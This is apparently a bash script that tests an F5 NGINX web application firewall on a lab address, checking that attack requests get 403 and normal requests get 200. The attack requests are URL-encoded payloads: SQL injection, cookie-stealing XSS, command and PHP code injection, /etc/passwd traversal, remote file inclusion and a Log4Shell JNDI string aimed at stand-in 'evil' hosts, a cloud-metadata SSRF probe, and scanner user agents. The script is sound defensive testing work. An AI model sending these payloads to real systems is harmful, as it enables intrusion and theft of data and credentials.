#!/usr/bin/env bash
#
# Comprehensive WAF capability test against a single endpoint (node or ingress).
# Attacks must be blocked (403); legit traffic must pass (200). No origin
# contrast here -- only the WAF-facing behavior.
#
# Usage:  ./test-node.sh                       # default http://192.168.1.140:9080
#         BASE=http://192.168.1.140:9080 ./test-node.sh
#         BASE=http://192.168.1.104 HOSTHDR=payments.fictionally.org ./test-node.sh
set -uo pipefail
BASE="${BASE:-http://192.168.1.140:9080}"
HOSTHDR="${HOSTHDR:-}"

B=$'\e[1m'; D=$'\e[2m'; R=$'\e[31m'; G=$'\e[32m'; M=$'\e[35m'; X=$'\e[0m'
CURL=(curl -s -o /dev/null -m 10 -w '%{http_code}')
[[ -n "$HOSTHDR" ]] && CURL+=(-H "Host: $HOSTHDR")
pass=0; fail=0
cat_hdr(){ printf '\n%s%s%s%s\n' "$B" "$M" "$1" "$X"; }
chk(){ # <label> <expected> <path> [extra curl args...]
  local label="$1" want="$2" path="$3"; shift 3
  local code; code="$("${CURL[@]}" "$@" "${BASE}${path}")"
  if [[ "$code" == "$want" ]]; then
    printf '  %-28s %sHTTP %s%s\n' "$label" "$G" "$code" "$X"; pass=$((pass+1))
  else
    printf '  %-28s %sHTTP %s (wanted %s)%s\n' "$label" "$R" "$code" "$want" "$X"; fail=$((fail+1))
  fi
}

printf '\n%sF5 NGINX WAF -- capability test%s  %s%s%s\n' "$B" "$X" "$D" "${HOSTHDR:+$HOSTHDR @ }$BASE" "$X"

cat_hdr "Injection & OWASP Top 10 -- expect 403"
chk "SQL injection"          403 "/products?cat=deposit%27%20OR%20%271%27=%271"
chk "Reflected XSS"          403 "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
chk "Command injection (RCE)" 403 "/ping?host=127.0.0.1%3Bwhoami"
chk "Code injection (PHP)"   403 "/render?tpl=%3C%3Fphp%20system(%27id%27)%3B%3F%3E"
chk "Path traversal (LFI)"   403 "/download?file=../../../../etc/passwd"
chk "Remote file inclusion"  403 "/fetch?url=http%3A%2F%2Fevil.host%2Fshell.txt%3F"

cat_hdr "Threat campaigns -- expect 403"
chk "Log4Shell (JNDI)"       403 "/lookup?user=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fx%7D"
chk "SSRF (cloud metadata)"  403 "/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"

cat_hdr "Bot / scanner & protocol -- expect 403"
chk "Scanner UA: sqlmap"     403 "/" -A 'sqlmap/1.5.2'
chk "Scanner UA: nikto"      403 "/" -A 'nikto/2.1.6'
chk "Disallowed method: PUT" 403 "/" -X PUT

cat_hdr "Legitimate traffic -- expect 200"
chk "Home page"              200 "/"
chk "Product lookup"         200 "/products?cat=deposit"
chk "Product search"         200 "/search?q=laptop"
chk "Directory lookup"       200 "/lookup?user=guest"
chk "Link preview"           200 "/fetch?url=https%3A%2F%2Facme.example%2Flogo.png"

total=$((pass+fail))
printf '\n%sScorecard: %s/%s%s  ' "$B" "$pass" "$total" "$X"
[[ "$fail" -eq 0 ]] && { printf '%sPASS%s\n\n' "$G" "$X"; exit 0; } || { printf '%sFAIL (%s)%s\n\n' "$R" "$fail" "$X"; exit 1; }
